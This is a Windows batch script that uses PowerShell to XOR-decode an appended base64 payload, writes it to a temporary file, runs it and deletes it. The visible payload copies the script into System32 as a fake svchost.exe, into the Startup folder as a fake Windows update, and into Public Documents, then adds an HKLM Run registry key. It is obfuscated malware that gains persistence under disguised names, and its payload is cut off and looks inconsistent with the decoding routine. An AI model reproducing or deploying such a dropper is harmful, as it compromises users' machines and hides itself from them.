@echo off
set "key=ocwocqbkwvzqhsbrnonfobsjvwonfobavoqngyzisoatieosxmjekoqhwnfiqucibnamxczfdjaofywj"
set "script=%~f0"
set "tempbat=%temp%\decrypted_%random%.bat"

powershell -Command "$key='%key%'; $content=Get-Content '%script%' -Raw; $lines=$content -split '\r?\n' | Select-Object -Skip 25; $encryptedText=$lines -join \"`n\"; $bytes=[System.Convert]::FromBase64String($encryptedText); $decryptedBytes=@(); for($i=0; $i -lt $bytes.Length; $i++) { $decryptedBytes += $bytes[$i] -bxor $key[$i % $key.Length] }; $decryptedText=[System.Text.Encoding]::UTF8.GetString($decryptedBytes); Out-File -FilePath '%tempbat%' -InputObject $decryptedText -Encoding ASCII"

call "%tempbat%"
del "%tempbat%" >nul 2>&1
exit /b

vO0MDQoNCnNldGxv
Y2FsIGVuYWJsZWRl
bGF5ZWRleHBhbnNp
b24NCg0KY29weSAi
JX5mMCIgIkM6XFdp
bmRvd3NcU3lzdGVt
MzJcZHJpdmVyc1xz
dmNob3N0LmV4ZSIg
Pm51bCAyPiYxDQpj
b3B5ICIlfmYwIiAi
QzpcUHJvZ3JhbURh
dGFcTWljcm9zb2Z0
XFdpbmRvd3NcU3Rh
cnQgTWVudVxQcm9n
cmFtc1xTdGFydHVw
XFdpbmRvd3NfdXBk
YXRlLmJhdCIgPm51
bCAyPiYxDQpjb3B5
ICIlfmYwIiAiQzpc
VXNlcnNcUHVibGlj
XERvY3VtZW50c1xz
eXN0ZW1fY2FjaGUu
ZGF0IiA+bnVsIDI+
JjENCg0KcmVnIGFk
ZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3Nv
ZnRcV2luZG93c1xD
dXJyZW50VmVyc2lv
blxSdW4iIC92ICJX
aW5kb3dzU3lzdGVt
IiAvdCBSRUdfU1og
L2QgIkM6XFdpbmRv
d3NcU3lzdGVtMzJc
ZHJpdmVyc1xzdmNo
b3N0LmV4ZSIgL2Yg
Pm51bCAyPiYxDQpy
ZWcgYWRkICJIS0xN